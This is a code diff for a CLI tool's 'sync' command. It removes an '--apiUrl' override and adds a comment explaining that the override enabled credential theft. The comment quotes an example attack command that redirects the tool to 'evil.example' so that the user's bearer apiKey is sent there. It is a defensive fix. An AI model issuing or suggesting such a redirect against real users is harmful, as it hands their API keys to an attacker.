@@ -13,17 +13,26 @@ const syncCommand = define({
 			description: "Print only errors (use this for background/detached invocations).",
 			default: false,
 		},
-		apiUrl: {
-			type: "string",
-			description:
-				"Override the configured backend URL for this run only. Useful for self-hosters pushing one batch to a different backend without touching ~/.token-racer/config.json.",
-		},
+		// `--apiUrl` is INTENTIONALLY NOT accepted on `sync`.
+		//
+		// The sender attaches `Authorization: Bearer ${config.apiKey}` on every
+		// ingest POST. If we accepted `--apiUrl`, a victim tricked into running
+		// `token-racer sync --apiUrl https://evil.example` would ship their real
+		// bearer apiKey to the attacker's server — full account takeover from a
+		// single command. Since sync is also auto-invoked by the statusline
+		// hook, it carries the highest blast radius of any subcommand. The
+		// batch's Ed25519 signature makes the bearer redundant on ingest, but
+		// stripping only the header without coordinating the backend is risky.
+		// Simpler and safer: forbid the override on sync. Self-hosters still
+		// change backends via `token-racer setup --apiUrl …` (gated with
+		// `--allow-custom-backend`), which writes a fresh config and a
+		// destination-scoped apiKey.
 	},
 	async run(ctx) {
-		const { quiet, apiUrl } = ctx.values;
+		const { quiet } = ctx.values;
 
 		try {
-			const result = await sync(apiUrl !== undefined ? { apiUrl } : {});
+			const result = await sync();
 
 			if (!result.ok) {
 				// Failure — always print, even in quiet mode.
